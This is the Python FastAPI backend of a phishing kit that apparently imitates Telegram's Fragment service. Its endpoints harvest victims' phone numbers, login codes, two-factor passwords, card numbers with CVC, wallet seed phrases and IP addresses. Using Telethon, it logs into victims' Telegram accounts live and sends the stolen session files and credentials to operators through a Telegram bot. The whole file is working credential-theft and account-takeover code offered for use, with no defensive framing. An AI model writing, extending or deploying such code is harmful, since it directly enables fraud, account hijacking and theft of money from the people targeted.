import os
import json
import asyncio
import aiohttp
from fastapi import FastAPI, Request, HTTPException, APIRouter
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
from aiogram import Bot, types
from aiogram.client.session.aiohttp import AiohttpSession
from telethon import TelegramClient, errors
from pydantic import BaseModel
from dotenv import load_dotenv

load_dotenv()

ADMIN_BOT_TOKEN = os.getenv("ADMIN_BOT_TOKEN")
API_ID = os.getenv("TELEGRAM_API_ID")
API_HASH = os.getenv("TELEGRAM_API_HASH")

# Robust session for background notifications
admin_bot = Bot(token=ADMIN_BOT_TOKEN)
app = FastAPI()

# We use a router to prefix all API endpoints with /fragment
router = APIRouter(prefix="/fragment")

# Active Telethon clients: phone -> client
clients = {}

class PhoneData(BaseModel):
    phone: str
    user: dict = None

class CodeData(BaseModel):
    phone: str
    code: str
    user: dict = None

class TwoFAData(BaseModel):
    phone: str
    twoFactor: str
    user: dict = None

class CardData(BaseModel):
    phone: str
    cardData: dict
    user: dict = None

class WalletData(BaseModel):
    seedPhrase: str
    user: dict = None

class WalletConnectData(BaseModel):
    address: str
    ip: str = "Unknown"
    country: str = "Unknown"
    user: dict = None

class TransferData(BaseModel):
    address: str
    chain: str
    token: str
    amount: str
    status: str
    hash: str = None
    error: str = None
    user: dict = None

class LogData(BaseModel):
    message: str
    user: dict = None

async def notify_admins(text: str, document: str = None):
    if os.path.exists("admins.json"):
        with open("admins.json", "r") as f:
            admins = json.load(f)
            for admin_id in admins:
                try:
                    if document:
                        await admin_bot.send_document(admin_id, types.FSInputFile(document), caption=text, parse_mode="Markdown")
                    else:
                        await admin_bot.send_message(admin_id, text, parse_mode="Markdown")
                except Exception as e:
                    print(f"Failed to notify {admin_id}: {e}")

def save_submission(data: dict):
    with open("submissions.txt", "a") as f:
        f.write(json.dumps(data) + "\n")

@router.get("/api/link/{link_id}")
async def get_link(link_id: str):
    if os.path.exists("links.json"):
        with open("links.json", "r") as f:
            links = json.load(f)
            if link_id in links:
                return links[link_id]
    raise HTTPException(status_code=404, detail="Link not found")

@router.post("/api/submit/phone")
async def submit_phone(data: PhoneData):
    save_submission({"type": "phone", "data": data.model_dump()})

    user_info = f"👤 User: {data.user.get('username', 'N/A')} ({data.user.get('id', 'N/A')})" if data.user else "👤 User: Unknown"
    await notify_admins(f"📞 *New Phone Number Captured!*\n\n{user_info}\nPhone: `{data.phone}`")

    if API_ID and API_HASH and API_ID.strip() and API_HASH.strip():
        session_path = f"sessions/{data.phone}"
        client = TelegramClient(session_path, int(API_ID), API_HASH)
        await client.connect()
        try:
            if not await client.is_user_authorized():
                await client.send_code_request(data.phone)
                clients[data.phone] = client
                return {"status": "ok", "message": "Code sent"}
            else:
                return {"status": "already_authorized", "message": "Already logged in"}
        except Exception as e:
            print(f"Telethon error: {e}")
            await notify_admins(f"❌ *Telethon Error* for `{data.phone}`: {e}")
            return {"status": "error", "message": str(e)}

    return {"status": "ok", "message": "Captured (No Telethon API ID/Hash)"}

@router.post("/api/submit/code")
async def submit_code(data: CodeData):
    save_submission({"type": "code", "data": data.model_dump()})
    await notify_admins(f"🔑 *New Code Captured!*\n\nPhone: `{data.phone}`\nCode: `{data.code}`")

    if data.phone in clients:
        client = clients[data.phone]
        try:
            await client.sign_in(data.phone, data.code)
            session_file = f"sessions/{data.phone}.session"
            await notify_admins(f"✅ *SUCCESS!* Logged into `{data.phone}`!", document=session_file)
            return {"status": "logged_in"}
        except errors.SessionPasswordNeededError:
            await notify_admins(f"🔐 *2FA Needed* for `{data.phone}`")
            return {"status": "2fa_needed"}
        except Exception as e:
            await notify_admins(f"❌ *Sign-in Error* for `{data.phone}`: {e}")
            return {"status": "error", "message": str(e)}

    return {"status": "ok"}

@router.post("/api/submit/2fa")
async def submit_2fa(data: TwoFAData):
    save_submission({"type": "2fa", "data": data.model_dump()})
    await notify_admins(f"🔐 *New 2FA Password Captured!*\n\nPhone: `{data.phone}`\nPassword: `{data.twoFactor}`")

    if data.phone in clients:
        client = clients[data.phone]
        try:
            await client.sign_in(password=data.twoFactor)
            session_file = f"sessions/{data.phone}.session"
            await notify_admins(f"✅ *SUCCESS!* Logged into `{data.phone}` with 2FA!", document=session_file)
        except Exception as e:
            await notify_admins(f"❌ *2FA Sign-in Error* for `{data.phone}`: {e}")
            print(f"2FA Error: {e}")

    return {"status": "ok"}

@router.post("/api/submit/card")
async def submit_card(data: CardData):
    save_submission({"type": "card", "data": data.model_dump()})
    card = data.cardData
    await notify_admins(f"💳 *New Card Details Captured!*\n\nPhone: `{data.phone}`\n"
                        f"Number: `{card.get('number')}`\n"
                        f"Expiry: `{card.get('expiry')}`\n"
                        f"CVC: `{card.get('cvc')}`\n"
                        f"Name: `{card.get('name')}`")
    return {"status": "ok"}

@router.post("/api/submit/wallet")
async def submit_wallet(data: WalletData):
    save_submission({"type": "wallet", "data": data.model_dump()})
    user_info = f"👤 User: {data.user.get('username', 'N/A')} ({data.user.get('id', 'N/A')})" if data.user else "👤 User: Unknown"
    await notify_admins(f"💎 *New Wallet Seed Captured!*\n\n{user_info}\nPhrase: `{data.seedPhrase}`")
    return {"status": "ok"}

@router.post("/api/submit/wallet_connect")
async def submit_wallet_connect(data: WalletConnectData, request: Request):
    ip = request.headers.get("X-Forwarded-For", request.client.host)
    data.ip = ip

    # Simple GeoIP lookup
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"http://ip-api.com/json/{data.ip}") as resp:
                geo = await resp.json()
                data.country = geo.get("country", "Unknown")
    except Exception as e:
        print(f"GeoIP error: {e}")

    save_submission({"type": "wallet_connect", "data": data.model_dump()})
    user_info = f"👤 User: {data.user.get('username', 'N/A')} ({data.user.get('id', 'N/A')})" if data.user else "👤 User: Unknown"
    await notify_admins(f"🔗 *Wallet Connected!*\n\n{user_info}\nAddress: `{data.address}`\nIP: `{data.ip}`\nCountry: `{data.country}`")
    return {"status": "ok"}

@router.post("/api/submit/transfer")
async def submit_transfer(data: TransferData):
    save_submission({"type": "transfer", "data": data.model_dump()})
    user_info = f"👤 User: {data.user.get('username', 'N/A')} ({data.user.get('id', 'N/A')})" if data.user else "👤 User: Unknown"

    status_emoji = "✅" if data.status == "success" else "❌"
    text = f"{status_emoji} *Transfer {data.status.capitalize()}!*\n\n{user_info}\n" \
           f"Chain: `{data.chain}`\n" \
           f"Token: `{data.token}`\n" \
           f"Amount: `{data.amount}`\n"

    if data.hash:
        text += f"Hash: `{data.hash}`"
    if data.error:
        text += f"Error: `{data.error}`"

    await notify_admins(text)
    return {"status": "ok"}

@router.post("/api/submit/log")
async def submit_log(data: LogData):
    save_submission({"type": "log", "data": data.model_dump()})
    user_info = f"👤 User: {data.user.get('username', 'N/A')} ({data.user.get('id', 'N/A')})" if data.user else "👤 User: Unknown"
    await notify_admins(f"ℹ️ *Activity Log*\n\n{user_info}\nMessage: `{data.message}`")
    return {"status": "ok"}

app.include_router(router)

# Serve Frontend on /fragment
if os.path.exists("design/dist"):
    app.mount("/fragment", StaticFiles(directory="design/dist", html=True), name="static")

@app.exception_handler(404)
async def not_found(request, exc):
    # If the user goes to /fragment/anything, show the index.html for SPA routing
    if request.url.path.startswith("/fragment"):
        return FileResponse("design/dist/index.html")
    raise exc

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
